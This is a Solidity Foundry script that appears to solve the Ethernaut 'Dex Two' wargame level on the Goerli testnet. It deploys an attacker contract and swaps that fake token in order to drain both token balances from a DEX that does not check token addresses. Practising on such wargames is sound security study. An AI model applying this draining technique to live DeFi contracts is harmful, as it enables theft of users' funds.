// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.16;

import { Script } from "forge-std/script.sol";
import { DexTwo, SwappableTokenTwo } from "src/DexTwo/DexTwo.sol";
import { DexTwoAttack } from "src/DexTwo/DexTwoAttack.sol";

contract DexTwoAttackScript is Script {
    DexTwoAttack public attacker;
    function run() public {
        // goerli testnet
        address dextwoInstance = address(0x96a1F6da17560964c23523b93f01e28Fb05837C4);
        address token1 = DexTwo(dextwoInstance).token1();
        address token2 = DexTwo(dextwoInstance).token2();

        vm.startBroadcast();

        // create new attacker contract
        attacker = new DexTwoAttack(address(0x96a1F6da17560964c23523b93f01e28Fb05837C4), msg.sender);

        // swap out the token with a balance with our attacker token
        attacker.tokenToDrain(token1);
        DexTwo(dextwoInstance).swap(address(attacker), token1, SwappableTokenTwo(token1).balanceOf(dextwoInstance));

        // swap out the token with a balance with our attacker token
        attacker.tokenToDrain(token2);
        DexTwo(dextwoInstance).swap(address(attacker), token2, SwappableTokenTwo(token2).balanceOf(dextwoInstance));

        vm.stopBroadcast();
    }
}